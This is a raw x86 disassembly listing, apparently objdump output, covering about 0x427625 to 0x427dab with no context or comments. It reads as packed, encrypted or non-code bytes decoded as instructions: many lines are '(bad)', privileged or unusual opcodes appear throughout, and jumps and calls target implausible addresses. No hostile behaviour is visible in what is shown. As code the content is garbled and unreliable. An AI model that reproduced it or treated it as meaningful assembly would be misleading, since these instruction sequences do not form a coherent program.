  427625:	les    eax,FWORD PTR [ebp-0x35]
  427628:	mov    ecx,esi
  42762a:	lock or al,cl
  42762d:	clc    
  42762e:	inc    ebp
  42762f:	add    esi,DWORD PTR [ebx]
  427631:	jge    0x427636
  427633:	xor    edi,DWORD PTR [ebx]
  427635:	cmp    ecx,DWORD PTR [edi]
  427637:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42763c:	mov    edi,DWORD PTR [ecx]
  42763e:	test   al,0xcc
  427640:	dec    ebp
  427641:	test   BYTE PTR [ebx],dh
  427643:	pop    es
  427644:	xor    eax,DWORD PTR [eax]
  427646:	add    ecx,DWORD PTR [esi]
  427648:	add    ecx,eax
  42764a:	psraw  mm0,mm1
  42764d:	sub    BYTE PTR [ebp+0x38],cl
  427650:	mov    edi,DWORD PTR [ebx]
  427652:	lock int3 
  427654:	shl    edx,1
  427656:	rol    BYTE PTR [ebp+0xc],1
  427659:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427660:	jmp    0x7b76aa
  427665:	pushf  
  427666:	inc    ebp
  427667:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42766d:	xor    ecx,ebx
  42766f:	add    ecx,esi
  427671:	mov    esi,eax
  427673:	enter  0x45af,0x8b
  427677:	xor    ecx,eax
  427679:	add    edx,DWORD PTR [ebp-0x77]
  42767c:	sub    ecx,DWORD PTR [eax]
  42767e:	cmp    eax,DWORD PTR [ebp+0x77]
  427681:	fmul   DWORD PTR [ebx-0x76385764]
  427687:	test   al,0x0
  427689:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42768f:	cmp    esi,DWORD PTR [ebx]
  427691:	pushf  
  427692:	xor    eax,edi
  427694:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42769b:	inc    ebp
  42769c:	dec    ebp
  42769d:	cmp    eax,0xc7f09c8b
  4276a2:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  4276a9:	inc    ebp
  4276aa:	jmp    0x4276eb
  4276ac:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4276b3:	dec    ebp
  4276b4:	xor    esi,DWORD PTR [ebx]
  4276b6:	add    eax,DWORD PTR [ebx]
  4276b8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4276be:	dec    ebp
  4276bf:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276c5:	out    dx,eax
  4276c6:	rol    BYTE PTR [eax],1
  4276c8:	add    eax,0xebc8458b
  4276cd:	dec    ebp
  4276ce:	mov    ebp,DWORD PTR [ebx]
  4276d0:	mov    esp,0x33f84d8b
  4276d5:	ret    
  4276d6:	xor    eax,esi
  4276d8:	add    ecx,eax
  4276da:	add    eax,DWORD PTR [edx+0xc1010f]
  4276e0:	dec    ebp
  4276e1:	inc    ebp
  4276e2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276e8:	ror    bl,1
  4276ea:	add    eax,0xebc645ce
  4276ef:	scas   eax,DWORD PTR es:[edi]
  4276f0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276f6:	xor    ebp,DWORD PTR [ebx]
  4276f8:	xor    edi,DWORD PTR [ebx]
  4276fa:	add    esi,DWORD PTR [edi+0x3]
  4276fd:	mov    ecx,DWORD PTR [edi]
  4276ff:	clc    
  427700:	rol    ebx,0x4d
  427703:	(bad)  
  427704:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42770b:	mov    ah,0x45
  42770d:	dec    ebp
  42770e:	jbe    0x427743
  427710:	mov    esi,DWORD PTR [ebx]
  427712:	call   0x3345c41a
  427717:	rdpmc  
  427719:	rol    DWORD PTR [ebx],0x4d
  42771c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427722:	inc    ebp
  427723:	ror    BYTE PTR [ebx+0x45450808],1
  427729:	jmp    0x10a77b9
  42772e:	inc    ebp
  42772f:	inc    ebp
  427730:	(bad)  
  427731:	mov    ebx,eax
  427733:	clc    
  427734:	test   ebx,eax
  427736:	clc    
  427737:	retf   
  427738:	inc    ebp
  427739:	into   
  42773a:	mov    esi,0x8b85afec
  427740:	clc    
  427741:	enter  0x5545,0x3a
  427745:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42774c:	ret    
  42774d:	mov    ah,0xc6
  42774f:	addr16 push 0x338b4545
  427755:	clc    
  427756:	add    eax,ebx
  427758:	loopne 0x427725
  42775a:	dec    ebp
  42775b:	into   
  42775c:	mov    al,dh
  42775e:	or     BYTE PTR [edi-0x37ff748e],ch
  427764:	inc    ebp
  427765:	push   ebp
  427766:	mov    ebp,DWORD PTR [ebx]
  427768:	in     al,dx
  427769:	cmp    eax,ebx
  42776b:	ja     0x4277b2
  42776d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427773:	inc    ebp
  427774:	cwde   
  427775:	mov    esi,DWORD PTR [edx]
  427777:	clc    
  427778:	mov    bl,al
  42777a:	xlat   BYTE PTR ds:[ebx]
  42777b:	retf   
  42777c:	inc    ebp
  42777d:	into   
  42777e:	mov    eax,esi
  427780:	in     al,dx
  427781:	scas   eax,DWORD PTR es:[edi]
  427782:	retf   
  427783:	mov    ecx,DWORD PTR [ebp-0x38]
  427786:	mov    edx,DWORD PTR [ebp-0x24]
  427789:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427790:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427797:	mov    eax,DWORD PTR [ebx]
  427799:	clc    
  42779a:	loopne 0x42775f
  42779c:	push   ebp
  42779d:	retf   
  42779e:	mov    dh,al
  4277a0:	adc    esi,ecx
  4277a2:	jb     0x427753
  4277a4:	add    BYTE PTR [ebx+0x558bc845],cl
  4277aa:	in     al,dx
  4277ab:	sub    eax,ebx
  4277ad:	cmp    ecx,ebx
  4277af:	mov    eax,esi
  4277b1:	mov    esp,0x45af03ce
  4277b6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4277bc:	mov    eax,ebx
  4277be:	in     al,dx
  4277bf:	into   
  4277c0:	dec    ebp
  4277c1:	(bad)  
  4277c2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277c8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277cc:	xor    esp,esp
  4277ce:	sub    eax,DWORD PTR [ebp-0x75]
  4277d1:	add    ebp,esp
  4277d3:	mov    al,0x55
  4277d5:	inc    ebp
  4277d6:	xor    edi,DWORD PTR [eax]
  4277d8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277df:	inc    ebp
  4277e0:	xor    edi,DWORD PTR [ecx]
  4277e2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277e9:	test   DWORD PTR [eax],eax
  4277eb:	clc    
  4277ec:	enter  0x8645,0x33
  4277f0:	inc    DWORD PTR [ebx]
  4277f2:	(bad)  
  4277f3:	jmp    0x42783a
  4277f5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277fb:	inc    ebp
  4277fc:	(bad)  
  4277fd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427803:	cwde   
  427804:	retf   
  427805:	xor    al,cl
  427807:	mov    BYTE PTR [ebp+0xb],cl
  42780a:	lea    eax,[ebp+0x8]
  42780d:	xor    esi,DWORD PTR [edx+0x3]
  427810:	add    al,ah
  427812:	inc    ebp
  427813:	dec    ebp
  427814:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42781a:	push   0x2b45cd00
  42781f:	mov    al,BYTE PTR [ebx]
  427821:	or     esi,eax
  427823:	dec    ebp
  427824:	inc    ebp
  427825:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42782b:	push   ebp
  42782c:	(bad)  
  42782d:	mov    BYTE PTR [edi+0xf723b11],ch
  427833:	add    ch,ch
  427835:	inc    ebp
  427836:	dec    DWORD PTR [ebx-0x34332775]
  42783c:	add    al,0x4d
  42783e:	inc    ebp
  42783f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427845:	cwde   
  427846:	add    DWORD PTR [edx],esi
  427848:	add    BYTE PTR [ebx+0x4d00c000],cl
  42784e:	push   DWORD PTR [ebx]
  427850:	int3   
  427851:	xor    eax,DWORD PTR [eax]
  427853:	add    edx,DWORD PTR [eax+0x3]
  427856:	mov    DWORD PTR [edi],ecx
  427858:	call   0x4288391e
  42785d:	mov    DWORD PTR [ebp-0x20],esp
  427860:	add    BYTE PTR [ebp+0x7d],al
  427863:	mov    eax,DWORD PTR [eax]
  427865:	in     al,0x15
  427867:	ret    
  427868:	iret   
  427869:	(bad)  
  42786a:	enter  0x14af,0x8b
  42786e:	(bad)  
  42786f:	in     al,dx
  427870:	or     bl,cl
  427872:	adc    cl,al
  427874:	push   ebp
  427875:	dec    ebp
  427876:	inc    eax
  427877:	mov    edx,DWORD PTR [ebp-0x20]
  42787a:	jb     0x427847
  42787c:	mov    ecx,esi
  42787e:	cld    
  42787f:	scas   eax,DWORD PTR es:[edi]
  427880:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427887:	mov    BYTE PTR [eax],0x8c
  42788a:	push   0xffffff98
  42788c:	push   edi
  42788d:	xor    dl,BYTE PTR [eax+0x3b]
  427890:	mov    ecx,DWORD PTR [edi]
  427892:	call   0x8c41bdf5
  427897:	mov    eax,eax
  427899:	in     al,dx
  42789a:	jge    0x4278e9
  42789c:	mov    DWORD PTR [ebx],esi
  42789e:	int3   
  42789f:	add    eax,DWORD PTR [ebp+0xf]
  4278a2:	xor    eax,ecx
  4278a4:	(bad)  
  4278a5:	dec    ebp
  4278a6:	pushf  
  4278a7:	xor    ecx,eax
  4278a9:	add    edi,DWORD PTR [edi]
  4278ab:	mov    eax,DWORD PTR [ebp-0x38]
  4278ae:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  4278b5:	mov    DWORD PTR [edx+0xf4505c8],ecx
  4278bb:	xor    edx,DWORD PTR [ecx+edi*4]
  4278be:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278c5:	dec    ebp
  4278c6:	leave  
  4278c7:	mov    edx,ecx
  4278c9:	rol    BYTE PTR [ebp+0x330155],1
  4278cf:	add    ecx,DWORD PTR [ebp+0xf]
  4278d2:	xor    eax,edx
  4278d4:	(bad)  
  4278d5:	ror    DWORD PTR [eax],0x86
  4278d8:	jb     0x4278d7
  4278da:	add    bh,bh
  4278dc:	clc    
  4278dd:	inc    ebp
  4278de:	jb     0x42794a
  4278e0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278e6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278ec:	shr    BYTE PTR [eax-0x3d],0x30
  4278f0:	clc    
  4278f1:	add    BYTE PTR [ebp+0x75],al
  4278f4:	cmp    BYTE PTR [edx-0x64],ch
  4278f7:	inc    edi
  4278f9:	adc    al,0xe8
  4278fb:	inc    ebp
  4278fc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427902:	mov    ecx,DWORD PTR [eax]
  427904:	cld    
  427905:	or     DWORD PTR [ebp-0x34],0x33
  427909:	jbe    0x42790e
  42790b:	mov    edx,DWORD PTR [ecx+0x2b]
  42790e:	dec    ebp
  42790f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427915:	mov    BYTE PTR [ebx],dh
  427917:	mov    eax,DWORD PTR [ebx]
  427919:	or     BYTE PTR [ecx+0x3b],dl
  42791c:	dec    ebp
  42791d:	int3   
  42791e:	xor    ebp,edi
  427920:	add    eax,DWORD PTR [ebp+0x51]
  427923:	mov    ecx,DWORD PTR [ebp-0x28]
  427926:	xor    eax,DWORD PTR [eax]
  427928:	add    ebp,DWORD PTR [eax+0x51]
  42792b:	adc    BYTE PTR [eax+0x0],0x8b
  42792f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427935:	inc    ebp
  427936:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42793c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427942:	dec    ebp
  427943:	mov    esi,DWORD PTR [ebx]
  427945:	hlt    
  427946:	add    eax,ebx
  427948:	push   ecx
  427949:	inc    ebp
  42794a:	dec    ebp
  42794b:	sar    bh,1
  42794d:	shl    ah,1
  42794f:	(bad)  
  427950:	retf   
  427951:	mov    al,ds:0xc5ff3dce
  427956:	adc    al,0xc6
  427958:	inc    ebp
  427959:	and    eax,0x9c0f4c85
  42795e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427965:	cmp    BYTE PTR [ebx+0x3b],0x0
  427969:	mov    dh,0xc7
  42796b:	cmp    eax,eax
  42796d:	jne    0x454371b9
  427973:	mov    edi,DWORD PTR [edx]
  427975:	mov    eax,0x848bcb9c
  42797a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427981:	or     BYTE PTR [edi],cl
  427983:	(bad)  
  427984:	dec    ebp
  427985:	inc    edi
  427986:	add    bh,0x50
  427989:	or     cl,ch
  42798b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427991:	xchg   DWORD PTR [eax-0x1638af64],eax
  427997:	mov    esp,0xf802b588
  42799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42799d:	inc    ebp
  42799e:	(bad)  
  42799f:	cmp    al,0xff
  4279a1:	pushf  
  4279a2:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4279a9:	mov    ecx,DWORD PTR [ebp-0x340018]
  4279af:	into   
  4279b0:	dec    DWORD PTR [ebx-0x7f72431c]
  4279b6:	push   0x5000ff01
  4279bb:	retf   
  4279bc:	inc    ebp
  4279bd:	into   
  4279be:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279c4:	push   eax
  4279c5:	into   
  4279c6:	call   0x4a7e56
  4279cb:	retf   
  4279cc:	add    dh,cl
  4279ce:	add    bh,bh
  4279d0:	mov    DWORD PTR [eax+ecx*1],edx
  4279d3:	clc    
  4279d4:	inc    ebp
  4279d5:	inc    ebp
  4279d6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279dc:	push   0x1
  4279de:	push   edi
  4279df:	add    BYTE PTR [eax-0x35],dl
  4279e2:	mov    ecx,esi
  4279e4:	cld    
  4279e5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279eb:	into   
  4279ec:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279f3:	xor    eax,DWORD PTR [ebp+0x3]
  4279f6:	jne    0x427a49
  4279f8:	call   DWORD PTR [eax-0x3c]
  4279fb:	mov    DWORD PTR [ecx-0x18],edx
  4279fe:	mov    edi,edi
  427a00:	call   0x8b45bf89
  427a05:	add    ah,ah
  427a07:	rol    BYTE PTR [ebp-0x7c],0xeb
  427a0b:	add    edi,edi
  427a0d:	add    al,ch
  427a0f:	inc    ebp
  427a10:	push   ecx
  427a11:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427a17:	mov    al,0xc7
  427a19:	test   esp,esp
  427a1b:	clc    
  427a1c:	test   DWORD PTR [ebp-0x8],ecx
  427a1f:	add    BYTE PTR [ebp+0x50],0x39
  427a23:	jmp    0x8bcc02c4
  427a28:	in     al,dx
  427a29:	or     BYTE PTR [ebp-0xf],al
  427a2c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a32:	hlt    
  427a33:	mov    eax,DWORD PTR [ebp-0x50]
  427a36:	xor    esi,ecx
  427a38:	add    eax,DWORD PTR [eax+0x4f086889]
  427a3e:	inc    ebp
  427a3f:	sbb    eax,0x68
  427a42:	pushf  
  427a43:	inc    edi
  427a45:	add    al,ch
  427a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a48:	test   edi,edi
  427a4a:	clc    
  427a4b:	inc    DWORD PTR [ebp-0x73]
  427a4e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a52:	(bad)  
  427a53:	push   ecx
  427a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a55:	jne    0x4279dc
  427a57:	push   eax
  427a58:	clc    
  427a59:	test   DWORD PTR [ebp-0x1],eax
  427a5c:	cmp    eax,0xc78b9cff
  427a61:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a68:	inc    ebp
  427a69:	push   edi
  427a6a:	aas    
  427a6b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a72:	dec    ebp
  427a73:	add    BYTE PTR [ebx],dh
  427a75:	inc    ebp
  427a76:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a7c:	enter  0x8401,0x0
  427a80:	add    al,BYTE PTR [eax]
  427a82:	add    bh,bh
  427a84:	out    dx,eax
  427a85:	sbb    BYTE PTR [eax],al
  427a87:	dec    ebp
  427a88:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a8e:	sub    esi,DWORD PTR [ebx]
  427a90:	mov    ebp,DWORD PTR [eax-0x8]
  427a93:	add    bl,0x0
  427a96:	(bad)  
  427a97:	cmp    eax,ecx
  427a99:	or     BYTE PTR [edx+0x750114],al
  427a9f:	inc    DWORD PTR [ebp+0x18]
  427aa2:	mov    eax,DWORD PTR [ebp-0x8]
  427aa5:	mov    ebx,eax
  427aa7:	(bad)  
  427aa8:	retf   
  427aa9:	inc    ebp
  427aaa:	into   
  427aab:	mov    esi,eax
  427aad:	int3   
  427aae:	scas   eax,DWORD PTR es:[edi]
  427aaf:	push   es
  427ab0:	mov    esi,DWORD PTR [ebp-0xc]
  427ab3:	call   DWORD PTR [ebp+0x18]
  427ab6:	sub    edi,DWORD PTR [ebp+0x3b]
  427ab9:	mov    esi,DWORD PTR [edi-0x34]
  427abc:	mov    eax,DWORD PTR [ebp-0x8]
  427abf:	cmp    bl,al
  427ac1:	pushf  
  427ac2:	mov    bh,0xbc
  427ac5:	fadd   QWORD PTR [eax]
  427ac7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427acd:	mov    esi,DWORD PTR [ebx]
  427acf:	in     al,0x33
  427ad1:	ret    
  427ad2:	add    eax,esi
  427ad4:	add    eax,DWORD PTR [ebp+0xf]
  427ad7:	mov    eax,ecx
  427ad9:	in     al,0x4d
  427adb:	ret    
  427adc:	mov    eax,esi
  427ade:	in     al,dx
  427adf:	inc    ebp
  427ae0:	rol    edi,1
  427ae2:	sar    al,1
  427ae4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aea:	add    BYTE PTR [edx],bh
  427aec:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427af3:	test   ebx,eax
  427af5:	clc    
  427af6:	retf   
  427af7:	inc    ebp
  427af8:	into   
  427af9:	cmp    al,0xc6
  427afb:	pushf  
  427afc:	scas   eax,DWORD PTR es:[edi]
  427afd:	(bad)  
  427afe:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427b05:	inc    ebp
  427b06:	cmp    edi,DWORD PTR [esi]
  427b08:	ja     0x427aa6
  427b0a:	mov    eax,edi
  427b0c:	mov    esp,0x458567a8
  427b11:	clc    
  427b12:	mov    eax,DWORD PTR [ebp-0x8]
  427b15:	mov    eax,ebx
  427b17:	in     al,dx
  427b18:	retf   
  427b19:	ret    
  427b1a:	into   
  427b1b:	mov    dh,0x7d
  427b1e:	scas   eax,DWORD PTR es:[edi]
  427b1f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b25:	add    BYTE PTR [ebx],ch
  427b27:	jmp    0xb97c67
  427b2c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b2f:	mov    eax,DWORD PTR [ebp-0x14]
  427b32:	inc    ebp
  427b33:	enter  0x458b,0xf8
  427b37:	xor    eax,ebx
  427b39:	add    ecx,ebx
  427b3b:	cmp    ecx,esi
  427b3d:	shufps xmm7,xmm4,0xaf
  427b41:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b47:	dec    ebp
  427b48:	sub    esi,DWORD PTR [ebx]
  427b4a:	cmp    esi,DWORD PTR [ebx]
  427b4c:	ja     0x427b51
  427b4e:	mov    eax,DWORD PTR [ebx]
  427b50:	lods   al,BYTE PTR ds:[esi]
  427b51:	mov    db0,ecx
  427b54:	inc    ebp
  427b55:	dec    ebp
  427b56:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b5c:	retf   
  427b5d:	rol    dh,1
  427b5f:	or     al,0xce
  427b61:	inc    ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b69:	add    BYTE PTR [ebx],ch
  427b6b:	add    BYTE PTR [ebx],bh
  427b6d:	inc    ebp
  427b6e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b74:	inc    ebp
  427b75:	retf   
  427b76:	mov    ecx,esi
  427b78:	clc    
  427b79:	(bad)  
  427b7a:	retf   
  427b7b:	scas   eax,DWORD PTR es:[edi]
  427b7c:	ret    
  427b7d:	mov    ecx,esi
  427b7f:	hlt    
  427b80:	(bad)  
  427b81:	push   ebp
  427b82:	scas   eax,DWORD PTR es:[edi]
  427b83:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b89:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b8f:	add    BYTE PTR [ebx],al
  427b91:	mov    eax,eax
  427b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b94:	inc    ebp
  427b95:	dec    ebp
  427b96:	cmp    BYTE PTR [ebx],dh
  427b98:	pushf  
  427b99:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b9f:	(bad)  
  427ba1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427ba9:	sar    eax,1
  427bab:	rol    BYTE PTR [ebp+0x5],1
  427bae:	xor    eax,DWORD PTR [ebp+0x3]
  427bb1:	jmp    0x427b9e
  427bb3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427bb9:	xor    eax,DWORD PTR [ebp+0x33]
  427bbc:	mov    eax,DWORD PTR [ebx]
  427bbe:	rol    BYTE PTR [ebx],1
  427bc0:	test   BYTE PTR [edi],cl
  427bc2:	cwde   
  427bc3:	shl    DWORD PTR [edx],0x4d
  427bc6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bcc:	xor    edx,eax
  427bce:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bd4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bda:	add    BYTE PTR [ebx],dh
  427bdc:	inc    ebp
  427bdd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427be3:	rdpmc  
  427be5:	rol    DWORD PTR [ebx],0x4d
  427be8:	loopne 0x427b75
  427bea:	push   ebp
  427beb:	in     al,dx
  427bec:	mov    cl,dl
  427bee:	adc    eax,edx
  427bf0:	jb     0x427bf7
  427bf2:	add    BYTE PTR [ebp+0x45],al
  427bf5:	jmp    0x427b82
  427bf7:	mov    ebx,eax
  427bf9:	test   al,0xcb
  427bfb:	dec    ebp
  427bfc:	dec    ebp
  427bfd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427c03:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427c09:	dec    ebp
  427c0a:	mov    al,0x8b
  427c0c:	dec    ebp
  427c0d:	in     al,dx
  427c0e:	xor    edx,ecx
  427c10:	xor    edx,eax
  427c12:	add    eax,DWORD PTR [ebp+0x3]
  427c15:	jbe    0x427c26
  427c17:	mov    eax,ecx
  427c19:	test   al,0x45
  427c1b:	dec    ebp
  427c1c:	mov    DWORD PTR [ebx],esi
  427c1e:	loopne 0x427c53
  427c20:	inc    ebp
  427c21:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c27:	rol    esi,0x45
  427c2a:	scas   eax,DWORD PTR es:[edi]
  427c2b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c31:	mov    eax,ecx
  427c33:	hlt    
  427c34:	dec    ebp
  427c35:	inc    ebp
  427c36:	mov    eax,edi
  427c38:	loopne 0x427c12
  427c3a:	retf   
  427c3b:	test   esi,ecx
  427c3d:	clc    
  427c3e:	scas   eax,DWORD PTR es:[edi]
  427c3f:	inc    ebp
  427c40:	mov    eax,edi
  427c42:	fdiv   st,st(0)
  427c44:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c4a:	cwde   
  427c4b:	cmp    dh,BYTE PTR [edx]
  427c4d:	pushf  
  427c4e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c54:	inc    esi
  427c56:	mov    ebp,DWORD PTR [eax-0x10]
  427c59:	inc    ebp
  427c5a:	dec    ebp
  427c5b:	xor    esi,DWORD PTR [ebx]
  427c5d:	add    eax,DWORD PTR [ebx]
  427c5f:	loopne 0x427c70
  427c61:	dec    ebp
  427c62:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c69:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c6f:	lock cwde 
  427c71:	ret    
  427c72:	xor    al,BYTE PTR [ebp-0x77]
  427c75:	mov    esi,esp
  427c77:	rol    BYTE PTR [ebp-0x7c],1
  427c7a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c80:	call   edi
  427c82:	enter  0x4d45,0x8b
  427c86:	mov    esi,eax
  427c88:	fmul   st(3),st
  427c8a:	push   ebp
  427c8b:	dec    ebp
  427c8c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c92:	ret    0xc198
  427c95:	xor    al,BYTE PTR [esi-0x280276]
  427c9b:	dec    ebp
  427c9c:	jne    0x427cd1
  427c9e:	mov    eax,DWORD PTR [ebx]
  427ca0:	cld    
  427ca1:	loopne 0x427c53
  427ca3:	push   ebp
  427ca4:	add    DWORD PTR [eax+0x72851100],ecx
  427caa:	inc    DWORD PTR [eax]
  427cac:	inc    DWORD PTR [ebp-0x75]
  427caf:	mov    edi,esp
  427cb1:	lock add bl,0x1
  427cb5:	retf   
  427cb6:	add    dh,al
  427cb8:	xor    dh,cl
  427cba:	inc    ebp
  427cbb:	scas   eax,DWORD PTR es:[edi]
  427cbc:	mov    eax,DWORD PTR [ebx]
  427cbe:	shl    al,0x0
  427cc1:	inc    ebp
  427cc2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427cc8:	call   0x458f00
  427ccd:	ud0    eax,ecx
  427cd0:	adc    al,0x4d
  427cd2:	inc    ebp
  427cd3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cd9:	lock push 0x338055
  427cdf:	add    eax,DWORD PTR [eax]
  427ce1:	ud0    ecx,edx
  427ce4:	sbb    BYTE PTR [ebp+0x5e],dl
  427ce7:	xor    ecx,ecx
  427ce9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cf0:	push   ecx
  427cf1:	add    BYTE PTR [ebp-0x38],cl
  427cf4:	mov    DWORD PTR [esi-0x740004],eax
  427cfa:	cld    
  427cfb:	inc    ebp
  427cfc:	xchg   edx,eax
  427cfd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427d03:	xabort 0xaf
  427d06:	icebp  
  427d07:	mov    esi,DWORD PTR [ebp-0x28]
  427d0a:	(bad)  
  427d0b:	retf   
  427d0c:	or     ecx,eax
  427d0e:	(bad)  
  427d0f:	dec    ebp
  427d10:	pop    es
  427d11:	(bad)  
  427d12:	(bad)  
  427d13:	or     BYTE PTR [esi],al
  427d15:	jb     0x427cdd
  427d17:	add    BYTE PTR [ebx],al
  427d19:	inc    ebp
  427d1a:	(bad)  
  427d1b:	mov    ecx,DWORD PTR [edx]
  427d1d:	fadd   st(6),st
  427d1f:	ret    
  427d20:	add    ch,BYTE PTR [eax-0x37]
  427d23:	int    0x55
  427d25:	sub    ebp,esp
  427d27:	add    edx,DWORD PTR [ecx-0x14]
  427d2a:	inc    ebp
  427d2b:	inc    ebp
  427d2c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d32:	cld    
  427d33:	(bad)  
  427d34:	mov    gs,WORD PTR [edi+0xf893be0]
  427d3a:	mov    ebp,ebp
  427d3c:	clc    
  427d3d:	push   eax
  427d3f:	push   DWORD PTR [ebp-0x4]
  427d42:	mov    BYTE PTR [ebp+0xa],0xff
  427d46:	(bad)  
  427d47:	int3   
  427d48:	or     BYTE PTR [eax],al
  427d4a:	(bad)  
  427d4b:	lea    eax,[edi]
  427d4d:	ins    BYTE PTR es:[edi],dx
  427d4e:	(bad)  
  427d4f:	inc    DWORD PTR [ecx]
  427d51:	push   eax
  427d52:	mov    BYTE PTR [ebp+0x9],0x8b
  427d56:	leave  
  427d57:	les    edx,FWORD PTR [ebp+0x0]
  427d5a:	in     al,dx
  427d5b:	call   DWORD PTR [ecx-0x75]
  427d5e:	inc    ebp
  427d5f:	cld    
  427d60:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d66:	cld    
  427d67:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d6d:	std    
  427d6e:	mov    eax,DWORD PTR [eax]
  427d70:	clc    
  427d71:	test   eax,esi
  427d73:	je     0x427dea
  427d75:	mov    eax,esi
  427d77:	cld    
  427d78:	add    al,0x80
  427d7a:	add    WORD PTR [ecx+0x0],ax
  427d7e:	fadd   QWORD PTR [eax]
  427d80:	mov    BYTE PTR [eax],0xd0
  427d83:	push   0xffffffc3
  427d85:	push   edi
  427d86:	mov    edx,DWORD PTR [eax+0x51]
  427d89:	pop    edi
  427d8a:	lea    ebx,[ebx-0x8]
  427d8d:	ret    0x45
  427d90:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d96:	xchg   eax,edi
  427d98:	mov    DWORD PTR [ebp-0x75],ecx
  427d9b:	push   esi
  427d9c:	clc    
  427d9d:	jne    0x427d6f
  427d9f:	mov    ecx,0xf8450b0b
  427da4:	(bad)  
  427da5:	push   cs
  427da6:	or     BYTE PTR [ebp-0x3a],dh
  427da9:	cmp    eax,DWORD PTR [ecx]
  427dab:	pop    esi
